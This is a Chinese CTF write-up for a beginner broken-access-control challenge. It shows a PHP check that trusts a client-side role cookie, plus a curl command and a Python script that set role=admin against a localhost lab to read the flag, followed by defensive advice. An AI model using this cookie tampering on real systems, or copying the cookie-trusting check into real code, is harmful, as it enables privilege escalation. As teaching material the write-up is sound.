# 越权访问

## 题目信息

- **题目名称**：你没有权限——真的吗
- **难度**：★☆☆☆☆
- **考点**：越权访问（Broken Access Control）、Cookie 篡改

## 题目描述

普通用户看不到 flag，只有管理员能看。但这个权限校验，真的靠谱吗？试着改改请求，看看会发生什么。

## 解法步骤

### 第一步：分析功能

打开页面显示"当前身份：guest"和"访问被拒绝"。页面提示"你的身份信息存储在 Cookie 中"。

### 第二步：检查 Cookie

通过浏览器开发者工具或 curl 查看请求中的 Cookie 信息，发现 `role=guest`。

### 第三步：篡改 Cookie

将 Cookie 中的 `role` 值从 `guest` 改为 `admin`：

```php
if ($role === 'admin') {
    echo file_get_contents('/flag');
}
```

### 第四步：获取 Flag

```bash
curl --cookie "role=admin" http://127.0.0.1:13392/
```

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13392'
r = requests.get(BASE, cookies={'role': 'admin'})
import re
flag = re.search(r'flag\{[^}]+\}', r.text).group()
print(f'[+] {flag}')
```

## 漏洞原理

### 越权访问

越权访问（Broken Access Control）是 Web 安全中最常见也最基础的漏洞之一。其本质是**服务端没有对用户的权限进行有效验证**，攻击者通过修改请求参数即可获得更高权限。

### 常见越权类型

- **垂直越权**：普通用户执行管理员操作（如本题）
- **水平越权**：用户 A 访问用户 B 的私有数据
- **未授权访问**：未登录即可访问需认证的页面

### 防御方法

- 权限校验在**服务端**进行，不依赖客户端传来的参数
- 使用 Session 存储用户角色，而非 Cookie
- 对每个敏感操作进行权限检查
- 使用 JWT（JSON Web Token）等防篡改机制
